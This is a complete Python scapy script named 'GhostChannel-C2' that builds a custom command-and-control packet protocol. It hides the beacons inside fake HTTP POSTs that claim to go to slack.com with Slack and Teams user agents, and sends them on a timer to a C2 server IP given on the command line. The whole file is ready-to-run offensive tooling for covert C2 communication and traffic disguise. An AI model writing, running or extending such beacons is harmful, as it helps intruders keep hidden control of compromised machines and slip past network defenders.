from scapy.all import *
import time
import random
import argparse
import sys

# =========================
# GhostChannel C2 Protocol
# =========================

class GhostChannel(Packet):
    name = "GhostChannel"
    fields_desc = [
        StrFixedLenField("magic", b"GCHN", 4),
        ByteEnumField("msg_type", 1, {
            1: "BEACON",
            2: "TASK",
            3: "RESULT",
            4: "PING"
        }),
        ShortField("length", 0),
        StrLenField("data", b"", length_from=lambda pkt: pkt.length)
    ]

# =========================
# HTTP Wrapper
# =========================

USER_AGENTS = [
    "Slack/4.33.73 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Microsoft Teams/1.6.00.4472"
]

def build_fake_http(binary_data: bytes) -> bytes:
    ua = random.choice(USER_AGENTS)
    headers = (
        f"POST /api/client HTTP/1.1\r\n"
        f"Host: slack.com\r\n"
        f"User-Agent: {ua}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(binary_data)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode()
    return headers + binary_data

# =========================
# Beacon Builder
# =========================

def build_beacon(dst_ip, dst_port):
    body = b"beacon-alive"

    c2 = GhostChannel(
        msg_type=1,
        length=len(body),
        data=body
    )

    raw_c2 = bytes(c2)
    http_payload = build_fake_http(raw_c2)

    pkt = (
        IP(dst=dst_ip) /
        TCP(dport=dst_port, flags="PA", seq=random.randint(10000, 50000)) /
        Raw(load=http_payload)
    )
    return pkt

# =========================
# Main
# =========================

def main():
    parser = argparse.ArgumentParser(
        description="GhostChannel-C2 (Fake HTTPS Beacon Generator)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument(
        "-t", "--target",
        required=True,
        help="C2 server IP address"
    )

    parser.add_argument(
        "-p", "--port",
        type=int,
        default=443,
        help="Destination port"
    )

    parser.add_argument(
        "-i", "--interval",
        type=int,
        default=30,
        help="Beacon interval (seconds)"
    )

    parser.add_argument(
        "--once",
        action="store_true",
        help="Send only one beacon and exit"
    )

    args = parser.parse_args()

    print("[*] GhostChannel-C2 started")
    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Beacon interval: {args.interval}s")

    while True:
        pkt = build_beacon(args.target, args.port)
        send(pkt, verbose=False)
        print("[+] Beacon sent")

        if args.once:
            sys.exit(0)

        time.sleep(args.interval)

if __name__ == "__main__":
    main()
